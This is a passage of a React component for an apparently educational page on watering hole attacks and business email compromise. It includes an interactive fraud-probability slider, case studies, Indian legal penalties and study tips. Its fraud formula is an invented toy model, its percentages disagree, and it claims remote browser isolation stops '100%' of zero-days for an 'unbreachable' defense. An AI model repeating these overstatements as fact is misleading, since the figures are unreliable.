                  <span className={clsx("text-xs font-bold px-2.5 py-0.5 rounded border", activeThreat.categoryBadge)}>
                    {activeThreat.category}
                  </span>
                  <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-gray-300 font-mono">
                    Classification: {activeThreat.fbiClassification}
                  </span>
                </div>
                <h3 className="text-lg font-bold text-white mt-2">{activeThreat.name}</h3>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                    Exploitation Vector &amp; Mechanics
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.exploitationVector}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-amber-400 uppercase tracking-wider text-[10px] block">
                    Vulnerability Impact &amp; Telemetry Indicator
                  </span>
                  <p className="text-gray-300 leading-relaxed font-semibold">{activeThreat.vulnerabilityImpact}</p>
                  <p className="text-gray-400 text-[11px]">{activeThreat.telemetryIndicator}</p>
                </div>
              </div>

              <div className="space-y-4">
                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                    Resilient Enterprise Defense &amp; Countermeasures
                  </span>
                  <p className="text-gray-300 leading-relaxed">{activeThreat.resilientDefense}</p>
                </div>

                <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-1.5">
                  <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                    Technical Script / Pattern Example
                  </span>
                  <pre className="bg-black/90 p-3 rounded font-mono text-[11px] text-indigo-200 overflow-x-auto whitespace-pre-wrap border border-indigo-950/50">
                    {activeThreat.codeSnippet}
                  </pre>
                </div>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 4: Studio 2 - Live BEC Wire Fraud Laboratory */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-emerald-400">
              Interactive Concept Studio 2
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              4. BEC Wire Fraud Vulnerability &amp; Out-of-Band Laboratory
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Adjust transfer value A, executive authority factor T, and dual-auth verification strength R 
              to model fraud probability P_bec = 1 - exp(-(A × T) / R) and see how Out-of-Band verification reduces fraud success below 1.6%:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
            {/* Input Controls */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">Transfer &amp; Authority Variables</h3>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Transfer Amount Scale (A):</span>
                  <span className="text-cyan-400 font-bold font-mono">{transferAmountNormalized.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="5.0"
                  step="0.5"
                  value={transferAmountNormalized}
                  onChange={(e) => setTransferAmountNormalized(parseFloat(e.target.value))}
                  className="w-full accent-cyan-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1">
                <div className="flex justify-between text-gray-400">
                  <span>Perceived Authority Factor (T):</span>
                  <span className="text-rose-400 font-bold font-mono">{authorityFactor.toFixed(1)}x</span>
                </div>
                <input
                  type="range"
                  min="1.0"
                  max="4.0"
                  step="0.5"
                  value={authorityFactor}
                  onChange={(e) => setAuthorityFactor(parseFloat(e.target.value))}
                  className="w-full accent-rose-500 bg-gray-800"
                />
              </div>

              <div className="space-y-1 pt-1">
                <span className="text-gray-400 block">Dual-Auth Verification Strength (R):</span>
                <div className="grid grid-cols-3 gap-1.5">
                  <button
                    onClick={() => setDualAuthStrength(1)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      dualAuthStrength === 1
                        ? "bg-rose-950 border-rose-500 text-rose-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    None (1x)
                  </button>
                  <button
                    onClick={() => setDualAuthStrength(50)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      dualAuthStrength === 50
                        ? "bg-amber-950 border-amber-500 text-amber-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    Email Sign (50x)
                  </button>
                  <button
                    onClick={() => setDualAuthStrength(500)}
                    className={clsx(
                      "p-2 rounded border font-bold text-[10px] transition-all",
                      dualAuthStrength === 500
                        ? "bg-emerald-950 border-emerald-500 text-emerald-300"
                        : "bg-gray-950 border-gray-800 text-gray-400"
                    )}
                  >
                    OOB Voice (500x)
                  </button>
                </div>
              </div>
            </div>

            {/* Calculated Output Metrics */}
            <div className="bg-[#050811] p-5 rounded-xl border border-gray-800 col-span-1 md:col-span-2 space-y-4 text-xs">
              <h3 className="font-bold text-white uppercase tracking-wider text-[11px]">BEC Financial Telemetry</h3>

              <div className="grid grid-cols-2 gap-3">
                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Raw Wire Fraud Likelihood</span>
                  <span className="text-lg font-extrabold text-white">{becSimulation.rawFraudProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">Without Dual Authorization</span>
                </div>

                <div className="bg-gray-950 p-3 rounded-lg border border-gray-800">
                  <span className="text-gray-400 text-[10px] uppercase block">Actual Fraud Probability</span>
                  <span className="text-lg font-extrabold text-emerald-400">{becSimulation.actualFraudProb}%</span>
                  <span className="text-[10px] text-gray-400 block mt-0.5">With Out-of-Band Voice Active</span>
                </div>
              </div>

              <div className={clsx("p-4 rounded-lg border font-mono text-xs", becSimulation.badgeClass)}>
                <span className="font-bold block uppercase tracking-wider text-[10px]">Financial Security Assessment:</span>
                <p className="mt-1 font-extrabold text-sm">{becSimulation.statusMessage}</p>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 5: Studio 4 - BEC Defense Code Studio */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Graph API &amp; Sigma Rule Studio
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              5. Production BEC Governance &amp; OAuth Defense Studio
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore production Python Graph API inbox rule scanners, PowerShell OAuth consent grant auditors, 
              and Sigma detection rules for BEC wire transfer keywords:
            </p>
          </div>

          <div className="grid grid-cols-1 sm:grid-cols-3 gap-2">
            {Object.entries(codeDatabase).map(([key, item]) => (
              <button
                key={key}
                onClick={() => setActiveCodeTab(key)}
                className={clsx(
                  "p-3 rounded-xl border text-left transition-all duration-300 text-xs font-bold",
                  activeCodeTab === key
                    ? "bg-purple-950 border-purple-500 text-purple-300 shadow-md shadow-purple-950/50"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                {item.name}
              </button>
            ))}
          </div>

          <div className="bg-[#050811] p-5 sm:p-6 rounded-xl border border-gray-800 space-y-4">
            <div className="flex items-center justify-between border-b border-gray-800 pb-3">
              <h3 className="text-sm font-bold text-white">{activeCode.name}</h3>
              <span className="text-xs px-2.5 py-0.5 rounded bg-gray-900 border border-gray-800 text-purple-400 font-mono">
                Production Script / Rule
              </span>
            </div>

            <p className="text-xs text-gray-300">{activeCode.explanation}</p>

            <pre className="bg-black/90 p-4 rounded-lg font-mono text-xs text-purple-200 overflow-x-auto whitespace-pre-wrap border border-purple-950/50">
              {activeCode.code}
            </pre>
          </div>
        </section>

        {/* SECTION 6: Studio 3 - Regional West Bengal Pedagogical Case Studies */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-amber-400">
              Regional Engineering Applications
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              6. West Bengal Field Case Studies: Kolkata, Barrackpore, Ichapur &amp; Jadavpur
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Explore how cybersecurity leaders Mamata, Debangshu, Mahima, and Susmita defeat illicit OAuth consent grants, 
              neutralize Watering Hole exploits, and prevent attorney BEC scams across West Bengal enterprise networks:
            </p>
          </div>

          {/* Scenario Tabs */}
          <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-3">
            {localScenarios.map((sc) => (
              <button
                key={sc.id}
                onClick={() => setActiveScenarioId(sc.id)}
                className={clsx(
                  "p-4 rounded-xl border text-left transition-all duration-300 space-y-2",
                  activeScenarioId === sc.id
                    ? "bg-amber-950/60 border-amber-500 shadow-md"
                    : "bg-[#0b101c] border-gray-800 hover:border-gray-700 text-gray-400"
                )}
              >
                <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-gray-900 text-amber-300 border border-amber-800">
                  {sc.lead} · {sc.location.split(" ")[0]}
                </span>
                <h4 className="text-xs font-bold text-white line-clamp-1">{sc.title}</h4>
                <p className="text-[11px] text-gray-400 line-clamp-1">{sc.threatType}</p>
              </button>
            ))}
          </div>

          {/* Active Scenario Detailed Breakdown */}
          <div className="bg-[#070b14] p-6 rounded-xl border border-gray-800 space-y-5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-gray-800 pb-3">
              <div>
                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
                  {activeScenario.location}
                </span>
                <h3 className="text-base sm:text-lg font-bold text-white mt-0.5">{activeScenario.title}</h3>
              </div>
              <div className="text-right text-xs">
                <span className="text-gray-400 block">Lead Architect: {activeScenario.lead}</span>
                <span className="font-semibold text-emerald-400">Security Budget: {activeScenario.budget}</span>
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-5 text-xs">
              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px]">
                  The Incident &amp; Threat Mechanics
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.incident}</p>
              </div>

              <div className="bg-gray-950 p-4 rounded-lg border border-gray-800 space-y-2">
                <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px]">
                  Architectural Defense &amp; Resolution
                </span>
                <p className="text-gray-300 leading-relaxed">{activeScenario.defenseStrategy}</p>
              </div>
            </div>

            {/* Metrics Dashboard */}
            <div className="bg-[#050811] p-4 rounded-lg border border-gray-800 grid grid-cols-2 sm:grid-cols-4 gap-3 text-center">
              {Object.entries(activeScenario.metrics).map(([key, val]) => (
                <div key={key} className="bg-gray-950 p-2.5 rounded border border-gray-800/80">
                  <span className="text-[10px] text-gray-400 uppercase tracking-wider block capitalize">
                    {key.replace(/([A-Z])/g, " $1")}
                  </span>
                  <span className="text-xs sm:text-sm font-extrabold text-white mt-1 block">{val}</span>
                </div>
              ))}
            </div>
          </div>
        </section>

        {/* SECTION 7: Statutory & Legal Frameworks in India */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Statutory Jurisprudence
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              7. Legal Liabilities for Business Email Compromise in India
            </h2>
            <p className="text-sm text-gray-300 mt-2">
              Indian cyber law, criminal statutes, and banking regulations treat Business Email Compromise, 
              supplier invoice alteration, and financial wire fraud with severe statutory penalties:
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            <div className="bg-gray-950 p-5 rounded-xl border border-rose-950 space-y-3">
              <span className="text-xs font-bold text-rose-400 uppercase tracking-wider block">
                IT Act 2000 Section 66D
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Cheating by Personation:</strong> Impersonating suppliers or corporate executives in BEC wire fraud carries up to <span className="text-rose-400 font-bold">3 YEARS IMPRISONMENT</span> and fines.
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-blue-950 space-y-3">
              <span className="text-xs font-bold text-blue-400 uppercase tracking-wider block">
                IT Act Section 43(a) &amp; IPC 420
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">Section 43(a):</strong> Civil damages up to <span className="text-rose-400 font-bold">₹1 CRORE</span> for unauthorized access via EAC.
                </li>
                <li>
                  <strong className="text-white">IPC Section 420:</strong> Fraudulent inducement &amp; wire fraud (Up to 7 years prison).
                </li>
              </ul>
            </div>

            <div className="bg-gray-950 p-5 rounded-xl border border-emerald-950 space-y-3">
              <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider block">
                DPDP Act 2023 &amp; Helpline 1930
              </span>
              <ul className="space-y-2 text-gray-300">
                <li>
                  <strong className="text-white">DPDP Section 33:</strong> Fines up to <span className="text-rose-400 font-bold">₹250 CRORES</span> for failing to implement organizational data safeguards.
                </li>
                <li>
                  <strong className="text-white">MHA Helpline 1930:</strong> Report within 1 hour for automated CFCFRMS bank mule freeze.
                </li>
              </ul>
            </div>
          </div>
        </section>

        {/* SECTION 8: Common Pitfalls, Pro Tips, Thinking Hints & Mini Checklist */}
        <section className="bg-gray-900/90 rounded-2xl border border-gray-800 p-6 sm:p-8 space-y-6 shadow-xl">
          <div className="border-b border-gray-800 pb-4">
            <span className="text-xs font-bold uppercase tracking-wider text-purple-400">
              Exam &amp; Professional Mastery
            </span>
            <h2 className="text-xl sm:text-2xl font-bold text-white mt-1">
              8. Common Pitfalls, Industry Best Practices &amp; Key Hints
            </h2>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-5 text-xs">
            {/* Common Pitfalls */}
            <div className="bg-gray-950 p-4 rounded-xl border border-rose-950/60 space-y-3">
              <span className="font-bold text-rose-400 uppercase tracking-wider text-[10px] block">
                Common Beginner Mistakes
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Relying on Password Resets to Evict Attackers:</strong> Malicious OAuth consent grants persist via Graph API.
                </li>
                <li>
                  <strong>Trusting Changes in Bank Details Received by Email:</strong> Always call the vendor on a verified phone number.
                </li>
                <li>
                  <strong>Assuming Legitimate Industry Sites are Safe:</strong> Watering Hole attacks inject zero-days on trusted forums.
                </li>
              </ul>
            </div>

            {/* Professional Tips */}
            <div className="bg-gray-950 p-4 rounded-xl border border-emerald-950/60 space-y-3">
              <span className="font-bold text-emerald-400 uppercase tracking-wider text-[10px] block">
                Professional Tips &amp; Tricks
              </span>
              <ul className="space-y-2 text-gray-300 list-disc list-inside">
                <li>
                  <strong>Deploy Out-of-Band (OOB) Voice Verification:</strong> Call the supplier before updating banking remittance info.
                </li>
                <li>
                  <strong>Deploy Remote Browser Isolation (RBI):</strong> Render untrusted industry forums in cloud containers.
                </li>
                <li>
                  <strong>Audit Microsoft Graph API App Consents:</strong> Continuously revoke unverified `Mail.ReadWrite` permissions.
                </li>
              </ul>
            </div>

            {/* Hint Section */}
            <div className="bg-gray-950 p-4 rounded-xl border border-indigo-950/60 space-y-3">
              <span className="font-bold text-indigo-400 uppercase tracking-wider text-[10px] block">
                Pedagogical Thinking Hints
              </span>
              <ul className="space-y-2 text-gray-300">
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Think about...</span>
                  Why do malicious OAuth app consent grants survive corporate password resets and MFA changes?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Observe carefully...</span>
                  Why does Remote Browser Isolation (RBI) neutralize 100% of zero-day browser exploits on compromised Watering Hole sites?
                </li>
                <li className="p-2 bg-gray-900 rounded border border-gray-800">
                  <span className="text-indigo-300 font-bold block">Try changing this...</span>
                  In the BEC laboratory above, set verification strength to OOB Voice (500x) and observe fraud probability drop to 1.5%!
                </li>
              </ul>
            </div>
          </div>

          {/* Mini Checklist */}
          <div className="bg-gray-950 p-5 rounded-xl border border-gray-800 space-y-3">
            <h3 className="text-xs font-bold text-white uppercase tracking-wider text-rose-400">
              Student Mini Checklist (Exam &amp; Career Essentials)
            </h3>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-2.5 text-xs text-gray-300">
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Watering Hole attacks compromise legitimate third-party sites to infect visiting targets.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>The 5 BEC scenarios: Supplier Swindle, CEO Fraud, EAC, Attorney Impersonation, Data Theft.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Remote Browser Isolation (RBI) isolates zero-day web exploits inside disposable cloud containers.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Malicious OAuth consent grants persist through password resets by accessing Graph API directly.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Out-of-Band (OOB) dual authorization requires verbal confirmation for wire transfers &gt; ₹1,00,000.</span>
              </div>
              <div className="flex items-center gap-2 p-2.5 bg-gray-900 rounded border border-gray-800">
                <span className="text-emerald-400">✔</span>
                <span>Section 66D of the IT Act penalizes Cheating by Personation with up to 3 years imprisonment.</span>
              </div>
            </div>
          </div>
        </section>

        {/* SECTION 9: FAQ Template */}
        <section className="space-y-4">
          <FAQTemplate
            title="Watering Hole & BEC FAQs"
            subtitle="30 Moderate to Expert Practice Questions & Enterprise Financial Protection Deep Dives"
            questions={questions}
          />
        </section>

        {/* SECTION 10: PlainTextPrint Component */}
        <section className="space-y-4">
          <PlainTextPrint
            content={noteText}
            title="Watering Hole Attacks and Business Email Compromise (Printable Study Guide)"
            stampEnabled={true}
            showDownload={true}
            downloadButtonText="Download Note"
            downloadFileName="topic5_note.txt"
          />
        </section>

        {/* SECTION 11: Dedicated Teacher's Note */}
        <section className="pt-4">
          <Teacher
            note="Teacher's Note: Business Email Compromise (BEC) is the single most lucrative attack category in cybercrime today! Understand the FBI IC3 5-part taxonomy: Supplier Swindle (altering bank invoices), CEO Fraud (emergency wire demands), Email Account Compromise (EAC inside authentic mailboxes), Attorney Impersonation, and Data Theft (payroll/PAN harvesting). Learn how attackers maintain persistence via hidden Exchange transport rules and illicit OAuth application consent grants with Graph API `Mail.ReadWrite` permissions that persist across password resets! Understand how Watering Hole attacks compromise legitimate industry websites, using selective IP filtering to deliver zero-day browser exploits. To build an unbreachable defense: enforce Remote Browser Isolation (RBI) for all untrusted external sites, establish an inviolable Out-of-Band (OOB) Dual-Authorization policy requiring verbal phone verification on registered numbers for all wire transfers > ₹1,00,000, continuously audit Microsoft Graph API OAuth permissions, and deploy FIDO2 WebAuthn passkeys to eliminate EAC credential theft. Remember that Section 66D of the Indian IT Act treats Cheating by Personation as a severe criminal offense punishable with up to 3 years imprisonment!"
          />
        </section>

      </div>
    </div>
  );
};

export default Topic5;
